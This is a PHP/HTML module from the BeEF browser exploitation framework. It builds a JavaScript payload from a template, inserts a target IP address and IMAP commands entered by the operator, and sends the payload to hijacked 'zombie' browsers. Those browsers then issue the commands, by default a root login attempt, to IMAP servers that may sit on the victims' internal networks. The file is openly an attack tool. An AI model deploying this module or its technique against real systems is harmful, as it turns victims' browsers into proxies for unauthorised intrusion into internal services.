<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>
	var rtnval = "OK Clicked";

	Element.Methods.construct_code = function() {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		var temp_cmds = document.myform.cmd_str.value;
		temp_cmds = temp_cmds.replace(/\n/g, "\\\\n")

		// replace sections of the code with user input
		b64code = b64replace(b64code, "IP_ADDRESS", document.myform.ip_str.value);
		b64code = b64replace(b64code, "COMMAND", temp_cmds);

		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Inter-protocol Communication: IMAP4 </div>

<div class="entry">
	Using <a href=http://www.bindshell.net/papers/ipc>Inter-protocol Communication</a> the 
	zombie browser will send commands to an IMap4 server. The target address can be
	on the zombie's subnet which is potentially not directly accessible from the Internet.
 </div>

<div id="module_subsection">
	<form name="myform">
		<div id="module_subsection_header">Target Address</div>
		<input type="text" name="ip_str" value="localhost"/>
		<div id="module_subsection_header">Commands</div>
		<textarea name="cmd_str" rows="5" cols="80">a001 CAPABILITY
a01 login root password
a002 logout</textarea>

		<input class="button" type="button" value=" Send Now " onClick="javascript:construct_code()"/>
	</form>
</div>
</div>

